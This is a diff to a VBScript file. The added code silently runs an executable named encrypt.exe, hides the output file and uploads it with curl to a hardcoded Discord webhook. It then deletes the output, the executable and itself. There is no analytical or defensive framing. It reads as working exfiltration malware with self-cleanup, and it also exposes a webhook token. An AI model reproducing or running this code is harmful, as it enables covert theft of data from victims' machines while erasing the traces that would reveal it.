@@ -39,17 +39,47 @@ End If
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "encrypt.exe > output.txt", 0, False
 Set objShell = Nothing
-
-' HIER WAS IK GEBLEVEN
-'---------------------
+SetAttr "output.txt", vbHidden
 
 WScript.Sleep 10000
 
-' Delete the script file
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-objFSO.DeleteFile strScriptPath
+Dim objShell
+Set objShell = WScript.CreateObject("WScript.Shell")
 
-' Delete the bat file
-If objFSO.FileExists(strBatPath) Then
-    objFSO.DeleteFile strBatPath
-End If
+' Discord webhook URL
+Dim discordWebhook
+discordWebhook = "https://discord.com/api/webhooks/1202328029196730398/24xNitV8WYbF4qUql5MncBzaVeyDJfvAwLOsSdU8yPl17R4mwT8Juyo9TWGqi2FEfYBL"
+
+' Construct the cURL command
+Dim curlCommand
+curlCommand = "curl -i -X POST -H ""Content-Type: multipart/form-data"" -F ""file=@output.txt"" " & discordWebhook
+
+' Display the cURL command
+WScript.Echo "Sending cURL command: " & curlCommand
+
+' Run the cURL command
+objShell.Run curlCommand, 0, True
+
+' Clean up
+Set objShell = Nothing
+
+' Delete the script file
+Dim objFSO
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+' Specify the files to be deleted
+Dim filesToDelete
+filesToDelete = Array("output.txt", "encrypt.exe", WScript.ScriptFullName)
+
+' Delete each file
+For Each file In filesToDelete
+    If objFSO.FileExists(file) Then
+        ' Unhide the file before deleting
+        SetAttr file, vbNormal
+        ' Delete the file
+        objFSO.DeleteFile file
+    End If
+Next
+
+' Clean up
+Set objFSO = Nothing
